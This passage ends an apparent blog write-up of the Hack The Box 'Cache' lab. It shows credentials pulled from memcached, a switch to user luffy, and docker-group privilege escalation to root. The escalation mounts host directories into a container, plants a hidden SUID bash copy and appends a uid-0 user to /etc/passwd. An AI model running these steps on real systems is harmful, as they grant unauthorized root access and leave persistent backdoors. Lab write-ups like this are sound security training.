</span></pre></table></code></div></div><p>We can now use the <code class="language-plaintext highlighter-rouge">get</code> command to fetch the information in plaintext.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="go">get link
VALUE link 0 21
https://hackthebox.eu
END

get user
VALUE user 0 5
luffy
END

get passwd
VALUE passwd 0 9
0n3_p1ec3
END

get file
VALUE file 0 7
nothing
END

get account
VALUE account 0 9
afhj556uo
</span></pre></table></code></div></div><p>And now we can change our user context to <code class="language-plaintext highlighter-rouge">luffy</code> from <code class="language-plaintext highlighter-rouge">ash</code>.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">ash@cache:~$</span><span class="w"> </span>su <span class="nt">-l</span> luffy
<span class="go">su -l luffy
Password: 0n3_p1ec3

</span><span class="gp">luffy@cache:~$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
</span></pre></table></code></div></div><h3 id="luffy--root-docker">luffy –&gt; root (Docker)</h3><p><b>root.txt</b></p><p>From the above <code class="language-plaintext highlighter-rouge">id</code>, we can see that the user <code class="language-plaintext highlighter-rouge">luffy</code> is a part of the <code class="language-plaintext highlighter-rouge">docker</code> group. By running the command <code class="language-plaintext highlighter-rouge">docker images</code>, we can also see there is an already installed <code class="language-plaintext highlighter-rouge">ubuntu</code> image.</p><p>By mounting to the <code class="language-plaintext highlighter-rouge">/root</code> directory + using <code class="language-plaintext highlighter-rouge">-it</code> flag to use the shell mode, we can now read the <code class="language-plaintext highlighter-rouge">root.txt</code> flag chaning directory into <code class="language-plaintext highlighter-rouge">/mnt</code>.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="gp">luffy@cache:~$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)

</span><span class="gp">luffy@cache:~$</span><span class="w"> </span>docker images
<span class="go">docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        13 months ago       64.2MB

</span><span class="gp">luffy@cache:~$</span><span class="w"> </span>docker run <span class="nt">-v</span> /root:/mnt <span class="nt">-it</span> ubuntu
<span class="go">docker run -v /root:/mnt -it ubuntu
</span><span class="gp">root@4d8f1abf4b10:/#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">id
uid=0(root) gid=0(root) groups=0(root)

</span><span class="gp">root@4d8f1abf4b10:/#</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">ls
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr

</span><span class="gp">root@4d8f1abf4b10:/#</span><span class="w"> </span><span class="nb">cd</span> /mnt
<span class="go">cd /mnt

</span><span class="gp">root@4d8f1abf4b10:/mnt#</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">ls
root.txt

</span><span class="gp">root@4d8f1abf4b10:/mnt#</span><span class="w"> </span><span class="nb">cat </span>root.txt
<span class="go">cat root.txt
</span><span class="gp">e85&lt;REDACTED&gt;</span>148
</pre></table></code></div></div><p><b>Root Shell</b></p><p>From the docker file system access, there are multiple ways to gain root shell.</p><p>1) Creating a SUID copy of <code class="language-plaintext highlighter-rouge">/bin/bash</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="c"># Mounting the `/` directory to `/mnt`</span>
luffy@cache:~<span class="nv">$ </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">-it</span> ubuntu

<span class="c"># Copying the `/bin/bash` into luffy's home directory</span>
root@df6dec947625:/mnt# <span class="nb">cp </span>bin/bash home/luffy/.local/.bigb0ss

root@df6dec947625:/mnt# <span class="nb">ls</span> <span class="nt">-ls</span> home/luffy/.local/.bigb0ss
<span class="nb">ls</span> <span class="nt">-ls</span> home/luffy/.local/.bigb0ss
1088 <span class="nt">-rwxr-xr-x</span> 1 root root 1113504 Oct 26 04:04 home/luffy/.local/.bigb0ss

<span class="c"># Configuring SUID to .bigb0ss</span>
root@df6dec947625:/mnt# <span class="nb">chmod </span>4777 home/luffy/.local/.bigb0ss

root@df6dec947625:/mnt# <span class="nb">ls</span> <span class="nt">-ls</span> home/luffy/.local/.bigb0ss
<span class="nb">ls</span> <span class="nt">-ls</span> home/luffy/.local/.bigb0ss
1088 <span class="nt">-rwsrwxrwx</span> 1 root root 1113504 Oct 26 04:04 home/luffy/.local/.bigb0ss

root@df6dec947625:/mnt# <span class="nb">exit
exit</span>

<span class="c"># Executing the .bigb0ss and gaining the root shell</span>
luffy@cache:~<span class="nv">$ </span>.local/.bigb0ss <span class="nt">-p</span>
.local/.bigb0ss <span class="nt">-p</span>
.bigb0ss-4.4# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span>,999<span class="o">(</span>docker<span class="o">)</span>
.bigb0ss-4.4# <span class="nb">cat</span> /root/root.txt
<span class="nb">cat</span> /root/root.txt
e85&lt;REDACTED&gt;148
</pre></table></code></div></div><p>2) Adding New User as root</p><p>First, in our Kali box, we need to generate password salt</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> bigb0ss
<span class="go">Password: 
</span><span class="gp">$</span>1<span class="nv">$bigb0ss$BpDTAY12U2HOLINndbdWk</span>/
</pre></table></code></div></div><p>Then, we need to add the user <code class="language-plaintext highlighter-rouge">bigb0ss</code> and its password salt into <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file while logged in the docker session.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="c"># Mounting the `/` directory to `/mnt`</span>
luffy@cache:~<span class="nv">$ </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">-it</span> ubuntu

<span class="c"># Adding `bigb0ss` user</span>
root@a2fcb97125bd:/mnt# <span class="nb">echo</span> <span class="s1">'bigb0ss:$1$bigb0ss$BpDTAY12U2HOLINndbdWk/:0:0::/root:/bin/bash'</span> <span class="o">&gt;&gt;</span> etc/passwd

<span class="c"># Verifying the `/etc/passwd`</span>
root@a2fcb97125bd:/mnt# <span class="nb">tail </span>etc/passwd
<span class="nb">tail </span>etc/passwd
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
ash:x:1000:1000:ash:/home/ash:/bin/bash
luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
bigb0ss:<span class="nv">$1$bigb0ss$BpDTAY12U2HOLINndbdWk</span>/:0:0::/root:/bin/bash

root@a2fcb97125bd:/mnt# <span class="nb">exit
exit

</span>luffy@cache:~<span class="nv">$ </span>su bigb0ss
Password: <span class="nb">test

</span>root@cache:/home/luffy# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</pre></table></code></div></div><p>Thanks for reading! :]</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a>, <a href='/categories/linux/'>Linux</a>, <a href='/categories/medium/'>Medium</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/cache/" class="post-tag no-text-decoration" >cache</a> <a href="/tags/vhost/" class="post-tag no-text-decoration" >vhost</a> <a href="/tags/openemr/" class="post-tag no-text-decoration" >openemr</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >SQLi</a> <a href="/tags/memcached/" class="post-tag no-text-decoration" >memcached</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a> <a href="/tags/docker-privesc/" class="post-tag no-text-decoration" >docker-privesc</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://bigb0sss.github.io/posts/htb-cache-writeup/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <a href="https://twitter.com/intent/tweet?text=HTB - Cache Write-up - bigb0ss&url=https://bigb0sss.github.io/posts/htb-cache-writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB - Cache Write-up - bigb0ss&u=https://bigb0sss.github.io/posts/htb-cache-writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB - Cache Write-up - bigb0ss&url=https://bigb0sss.github.io/posts/htb-cache-writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/redteam-rotate-ip-aws-gateway/">Rotating Source IPs (Part 1) - AWS API Gateway</a><li><a href="/posts/htb-servmon-writeup/">HTB - ServMon Write-up</a></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/zip2john/">zip2john</a> <a class="post-tag" href="/tags/web.config-rce/">web.config rce</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/valentine/">valentine</a> <a class="post-tag" href="/tags/tomcat/">tomcat</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-frolic-writeup/"><div class="card-body"> <span class="timeago small" > Nov 18 <i class="unloaded">2020-11-18T10:36:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Valentine Write-up</h3><div class="text-muted small"><p> This was an easy difficulty box. Good learning path for: Source Code Review (Client-side JavaScript Authentication) Puzzles - Various Encoding Programming Bruteforcing Password Protected .ZI...</p></div></div></a></div><div class="card"> <a href="/posts/htb-teacher-writeup/"><div class="card-body"> <span class="timeago small" > Nov 22 <i class="unloaded">2020-11-22T10:25:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Teacher Write-up</h3><div class="text-muted small"><p> This one was an easy difficulty box. Good learning path for: Login Brute-forcing Moodle RCE - Math Formular Abuse MySQL DB Enum to Extract Password Privilege Escalation via Cronjob Initi...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blunder-writeup/"><div class="card-body"> <span class="timeago small" > Oct 24 <i class="unloaded">2020-10-24T11:25:00-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Blunder Write-up</h3><div class="text-muted small"><p> This box was pretty simple and easy one to fully compromise. Good learning path for: BLUDIT CMS 3.9.2 Brute-force Mitigation Bypass BLUDIT CMS 3.9.2 Directory Traversal Exploit CVE-2019-1428...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-blunder-writeup/" class="btn btn-outline-primary"><p>HTB - Blunder Write-up</p></a> <a href="/posts/htb-mischief-writeup/" class="btn btn-outline-primary"><p>HTB - Mischief Write-up</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//bigb0ss-blog.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://bigb0sss.github.io/posts/htb-cache-writeup/'; this.page.identifier = '/posts/htb-cache-writeup/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://www.linkedin.com/in/danielsmin">bigb0ss</a>. <span data-toggle="tooltip" data-placement="top" title="CC BY 4.0 ">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/zip2john/">zip2john</a> <a class="post-tag" href="/tags/web.config-rce/">web.config rce</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/valentine/">valentine</a> <a class="post-tag" href="/tags/tomcat/">tomcat</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://bigb0sss.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">[-] No result found</p>' }); </script>
